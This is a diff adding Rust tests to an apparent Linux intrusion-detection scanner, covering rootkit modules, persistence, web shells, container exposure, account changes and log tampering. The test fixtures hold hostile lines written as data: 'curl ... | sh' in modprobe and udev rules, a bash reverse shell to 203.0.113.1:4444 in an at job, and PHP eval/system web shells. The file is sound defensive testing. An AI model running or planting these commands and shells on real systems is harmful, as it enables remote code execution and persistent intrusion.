@@ -170,6 +170,7 @@ fn baseline_compare_skips_modules_not_scanned() {
         suid: vec![],
         listeners: vec![],
         persistence_files: Default::default(),
+        accounts: vec![],
     };
     let (f, notes) = baseline::compare(&b, &Default::default(), &["fs_perms".to_string()]);
     assert!(f.is_empty());
@@ -576,6 +577,7 @@ fn random_ports_of_a_known_program_are_not_new_listeners() {
         suid: vec![],
         listeners: vec![key("udp", 1716, "kdeconnectd"), key("udp", 40000, "kdeconnectd")],
         persistence_files: Default::default(),
+        accounts: vec![],
     };
     let mut inv = scanner::modules::Inventory::default();
     for p in [35622, 37707, 45314] {
@@ -817,6 +819,158 @@ fn no_login_log_is_a_note_not_a_crash() {
     let report = run_scan(&SysRoot::new(dir.path()), &Config::default(), &opts(&[ModuleId::AuthLogs]), &|_| {});
     assert!(report.findings.is_empty());
     assert!(report.notes.iter().any(|n| n.contains("no login log")), "{:?}", report.notes);
+}
+
+fn rules(report: &scanner::Report) -> Vec<String> {
+    report.findings.iter().map(|f| format!("{} {:?} {}", f.rule, f.severity, f.title)).collect()
+}
+
+fn found<'a>(report: &'a scanner::Report, rule: &str) -> &'a scanner::Finding {
+    report.findings.iter().find(|f| f.rule == rule).unwrap_or_else(|| panic!("no {rule} in {:#?}", rules(report)))
+}
+
+#[test]
+fn kernel_modules_and_settings() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/proc/modules", "ext4 1000 1 - Live 0x0\nnvidia 100 0 - Live 0x0 (POE)\nevil_driver 10 0 - Live 0x0 (OE)\ndiamorphine 10 0 - Live 0x0 (OE)\n");
+    for m in ["ext4", "nvidia", "evil_driver", "diamorphine", "ghost"] {
+        write(root, &format!("/sys/module/{m}/initstate"), "live\n");
+    }
+    write(root, "/sys/module/printk/parameters/x", "1"); // built in: no initstate
+    write(root, "/proc/sys/kernel/core_pattern", "|/tmp/.x %p\n");
+    write(root, "/proc/sys/kernel/modprobe", "/sbin/modprobe\n");
+    write(root, "/proc/sys/kernel/randomize_va_space", "0\n");
+    write(root, "/etc/modprobe.d/x.conf", "install dummy /bin/true\ninstall net-pf-10 curl -s http://x/y | sh\n");
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Kernel]), &|_| {});
+    assert!(found(&report, "KERN-MODULE-HIDDEN").title.contains("ghost"));
+    assert_eq!(found(&report, "KERN-ROOTKIT-NAME").severity, Severity::Critical);
+    let untrusted = found(&report, "KERN-MODULE-UNTRUSTED");
+    assert!(untrusted.evidence.contains("evil_driver") && !untrusted.evidence.contains("nvidia"), "{}", untrusted.evidence);
+    assert!(report.findings.iter().any(|f| f.rule == "KERN-SYSCTL" && f.title.contains("core_pattern") && f.severity == Severity::Critical));
+    assert!(report.findings.iter().any(|f| f.rule == "KERN-SYSCTL" && f.title.contains("randomize_va_space")));
+    assert!(!report.findings.iter().any(|f| f.title.contains("kernel.modprobe")), "the default modprobe path is fine");
+    assert_eq!(report.findings.iter().filter(|f| f.rule == "KERN-MODPROBE-CMD").count(), 1);
+}
+
+#[test]
+fn network_extras_dns_hosts_arp_routes_and_outbound() {
+    use scanner::modules::netwatch::is_public;
+    assert!(is_public(&"203.0.113.9".parse().expect("ip")) && !is_public(&"192.168.1.1".parse().expect("ip")) && !is_public(&"100.111.1.1".parse().expect("ip")));
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
+    let line = |i: u32, remote: &str, inode: u32| {
+        let r: SocketAddr = remote.parse().expect("addr");
+        format!("   {i}: {} {} 01 00000000:00000000 00:00000000 00000000     0        0 {inode} 1 0 100 0 0 10 0\n", encode_hex_addr(&"10.0.0.2:45000".parse().expect("addr")), encode_hex_addr(&r))
+    };
+    write(root, "/proc/net/tcp", &format!("{hdr}{}{}{}", line(0, "93.184.216.34:6881", 901), line(1, "93.184.216.34:443", 902), line(2, "45.33.1.1:53", 903)));
+    write(root, "/proc/700/stat", "700 (agent) S 1 0 0 0 -1 4194560 0 0\n");
+    write(root, "/proc/700/status", "Name:\tagent\nTgid:\t700\nPPid:\t1\nUid:\t0\t0\t0\t0\n");
+    write(root, "/proc/700/cmdline", "/opt/agent/agent\0");
+    symlink("/opt/agent/agent", root.join("proc/700/exe")).expect("exe");
+    fs::create_dir_all(root.join("proc/700/fd")).expect("fd");
+    for (n, inode) in [(3, 901), (4, 902), (5, 903)] {
+        symlink(format!("socket:[{inode}]"), root.join(format!("proc/700/fd/{n}"))).expect("sock");
+    }
+    write(root, "/etc/resolv.conf", "nameserver 192.168.1.1\nnameserver 185.1.2.3\n");
+    write(root, "/etc/hosts", "127.0.0.1 localhost\n6.6.6.6 deb.debian.org security.debian.org\n");
+    write(root, "/proc/net/route", "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT\neth0\t00000000\t0100000A\t0003\t0\t0\t100\t00000000\t0\t0\t0\n");
+    write(root, "/proc/net/arp", "IP address       HW type     Flags       HW address            Mask     Device\n10.0.0.1         0x1         0x2         aa:bb:cc:dd:ee:ff     *        eth0\n10.0.0.66        0x1         0x2         aa:bb:cc:dd:ee:ff     *        eth0\n");
+    write(root, "/sys/class/net/eth0/flags", "0x1103\n");
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
+    let out = found(&report, "NET-OUTBOUND-UNUSUAL");
+    assert!(out.evidence.contains("6881") && !out.evidence.contains(":443"), "{}", out.evidence);
+    found(&report, "NET-DNS-DIRECT");
+    assert!(found(&report, "NET-RESOLVER").evidence.contains("185.1.2.3"));
+    assert_eq!(found(&report, "NET-HOSTS-OVERRIDE").severity, Severity::High);
+    assert_eq!(found(&report, "NET-ARP-DUPLICATE").severity, Severity::High, "gateway MAC reused");
+    found(&report, "NET-PROMISC");
+    assert!(!report.has_rule("NET-ROUTE-DEFAULT"));
+}
+
+#[test]
+fn udev_at_jobs_keys_and_account_changes() {
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path().join("root");
+    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n");
+    write(&root, "/etc/group", "root:x:0:\nsudo:x:27:\nwww-data:x:33:\n");
+    write(&root, "/etc/shadow", "root:$y$abc:1::\nwww-data:*:1::\n");
+    let sys = SysRoot::new(&root);
+    let o = opts(&[ModuleId::Persistence]);
+    let first = run_scan(&sys, &Config::default(), &o, &|_| {});
+    let base = dir.path().join("baseline.json");
+    Baseline::from_report(&first).save(&base).expect("save");
+
+    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nwww-data:x:33:33::/var/www:/bin/bash\neve:x:1001:1001::/home/eve:/bin/bash\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n");
+    write(&root, "/etc/group", "root:x:0:\nsudo:x:27:www-data\nwww-data:x:33:\n");
+    write(&root, "/etc/shadow", "root:$y$abc:1::\nwww-data:$y$new:1::\neve:$y$x:1::\n_apt:*:1::\n");
+    write(&root, "/etc/udev/rules.d/99-x.rules", "ACTION==\"add\", RUN+=\"/bin/sh -c 'curl http://x/y | sh'\"\n");
+    write(&root, "/var/spool/cron/atjobs/a0001", "#!/bin/sh\nexport HOME='/home/x'\ncd /home/x\nbash -i >& /dev/tcp/203.0.113.1/4444 0>&1\n");
+    write(&root, "/etc/ssl/private/server.key", "key");
+    fs::set_permissions(root.join("etc/ssl/private/server.key"), fs::Permissions::from_mode(0o644)).expect("chmod");
+    let report = run_scan(&sys, &Config::default(), &ScanOptions { baseline_compare: Some(base), ..o }, &|_| {});
+    let new: Vec<_> = report.findings.iter().filter(|f| f.rule == "BASE-ACCOUNT-NEW").collect();
+    assert!(new.iter().any(|f| f.title.contains("eve") && f.severity == Severity::High), "{new:?}");
+    assert!(new.iter().any(|f| f.title.contains("_apt") && f.severity == Severity::Low), "{new:?}");
+    assert_eq!(found(&report, "BASE-ACCOUNT-SHELL").severity, Severity::Critical);
+    assert!(found(&report, "BASE-ACCOUNT-GROUP").evidence.contains("sudo"));
+    found(&report, "BASE-ACCOUNT-PASSWORD");
+    assert_eq!(found(&report, "PERS-UDEV").severity, Severity::Critical);
+    assert_eq!(found(&report, "PERS-AT-CMD").severity, Severity::Critical);
+    assert_eq!(found(&report, "PERS-KEY-PERMS").severity, Severity::High);
+}
+
+#[test]
+fn web_shells_and_container_access() {
+    use scanner::modules::services::webshell_pattern;
+    assert!(webshell_pattern("<?php eval ( $_POST['x'] ); ?>").is_some());
+    assert!(webshell_pattern("<?php echo htmlspecialchars($_GET['q']); ?>").is_none());
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    write(root, "/var/www/html/index.php", "<?php echo 'hi'; ?>");
+    write(root, "/var/www/html/uploads/.x.php", "<?php system($_REQUEST['c']); ?>");
+    write(root, "/var/www/html/notes.txt", "eval($_POST['x'])");
+    write(root, "/run/docker.sock", "");
+    fs::set_permissions(root.join("run/docker.sock"), fs::Permissions::from_mode(0o666)).expect("chmod");
+    write(root, "/proc/900/stat", "900 (sh) S 1 0 0 0 -1 4194560 0 0\n");
+    write(root, "/proc/900/status", "Name:\tsh\nTgid:\t900\nUid:\t0\t0\t0\t0\nCapEff:\t000001ffffffffff\n");
+    write(root, "/proc/900/cgroup", "0::/system.slice/docker-abc.scope\n");
+    write(root, "/proc/900/mountinfo", "1 2 0:1 /run/docker.sock /var/run/docker.sock rw - tmpfs tmpfs rw\n");
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Services]), &|_| {});
+    assert_eq!(report.findings.iter().filter(|f| f.rule == "SVC-WEBSHELL").count(), 1, "{:#?}", rules(&report));
+    assert_eq!(found(&report, "SVC-WEBSHELL").severity, Severity::Critical);
+    assert_eq!(found(&report, "SVC-CONTAINER-SOCKET").severity, Severity::Critical);
+    found(&report, "SVC-CONTAINER-PRIVILEGED");
+    found(&report, "SVC-CONTAINER-SOCKET-MOUNT");
+}
+
+#[test]
+fn log_and_time_integrity_and_account_events() {
+    use scanner::modules::auth_logs::{parse_line, Kind};
+    use scanner::modules::integrity::{backward_jumps, utmp_damage};
+    assert_eq!(utmp_damage(&[1u8; 384 * 2]), (false, 0));
+    assert_eq!(utmp_damage(&[0u8; 384 + 10]), (true, 1));
+    assert_eq!(backward_jumps("2026-01-02T10:00:00+01:00 a\n2026-01-02T08:00:00+01:00 b\n").len(), 1);
+    assert!(backward_jumps("2026-01-02T10:00:00+01:00 a\n2026-01-02T09:59:00+01:00 b\n").is_empty());
+    let e = parse_line("2026-01-02T10:00:00+01:00 h useradd[1]: new user: name=eve, UID=1001, GID=1001, home=/home/eve, shell=/bin/bash, from=none").expect("useradd");
+    assert_eq!((e.kind, e.user.as_str()), (Kind::Created { what: "user" }, "eve"));
+    let e = parse_line("2026-01-02T10:00:01+01:00 h usermod[2]: add 'eve' to group 'sudo'").expect("usermod");
+    assert_eq!(e.kind, Kind::GroupAdded { group: "sudo".into() });
+    let e = parse_line("2026-01-02T10:00:02+01:00 h gpasswd[3]: user eve added by root to group docker").expect("gpasswd");
+    assert_eq!(e.kind, Kind::GroupAdded { group: "docker".into() });
+
+    let dir = tempfile::tempdir().expect("tempdir");
+    let root = dir.path();
+    fs::create_dir_all(root.join("home/eve")).expect("mkdir");
+    symlink("/dev/null", root.join("home/eve/.bash_history")).expect("link");
+    write(root, "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h usermod[2]: add 'eve' to group 'sudo'\n2026-01-02T06:00:00+01:00 h CRON[1]: x\n");
+    fs::write(root.join("var/log/wtmp"), [0u8; 100]).expect("wtmp");
+    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Integrity, ModuleId::AuthLogs]), &|_| {});
+    found(&report, "INT-LOG-DEVNULL");
+    found(&report, "INT-TIME-BACKWARDS");
+    assert_eq!(found(&report, "INT-WTMP").severity, Severity::Medium);
+    assert_eq!(found(&report, "AUTH-GROUP-ADD").severity, Severity::Medium);
 }
 
 #[test]
